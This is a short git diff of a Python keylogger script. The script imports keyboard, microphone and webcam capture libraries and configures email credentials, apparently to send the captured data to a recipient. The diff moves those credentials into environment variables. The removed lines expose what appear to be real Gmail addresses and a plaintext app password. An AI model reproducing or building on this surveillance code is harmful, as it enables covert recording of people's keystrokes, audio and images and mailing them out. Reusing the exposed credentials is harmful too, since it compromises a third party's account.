@@ -22,16 +22,19 @@ import sounddevice as sd
 from pynput import keyboard
 from cv2 import VideoCapture, imwrite
 import schedule
+from dotenv import load_dotenv
+
+load_dotenv()
 
 # Inform user how to stop the keylogger session
 print("Press ESC to stop the Keylog Session")
 
 # ---------------------------- Configuration Section ----------------------------
 
-# Email credentials and recipient
-email_address = "work.nihalrahman@gmail.com"  # Sender email
-password = "tdteozexqqomwdzy"  # App password for sender
-toaddr = "prabhatbajpai2005@gmail.com"  # Recipient email
+# Email credentials and recipient (loaded from .env)
+email_address = os.getenv("SENDER_EMAIL", "")
+password = os.getenv("SENDER_PASSWORD", "")
+toaddr = os.getenv("RECEIVER_EMAIL", "")
 
 # File and session configuration
 file_path = os.getcwd() + "\\"  # Base directory path
